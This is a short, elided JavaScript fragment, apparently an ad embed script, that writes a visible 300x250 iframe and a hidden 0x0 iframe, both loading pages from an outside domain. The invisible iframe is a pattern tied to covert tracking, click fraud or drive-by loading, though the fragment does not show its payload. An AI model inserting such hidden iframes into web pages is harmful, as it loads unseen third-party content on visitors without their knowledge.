(function(){
	...
	var c = document,
		u = "http://code.yoyobeibei.com/aas/",
		w = "300",
		h = "250",
		...
		e.push('<iframe width="'+ w +'" height="'+ h +'" frameborder="0" src="'+ u +'media.html" scrolling="no"></iframe>');
		e.push('<iframe width="0" height="0" frameborder="0" src="http://code.yoyobeibei.com/wxl/show.html" scrolling="no"></iframe>');
		e.push('<div>');
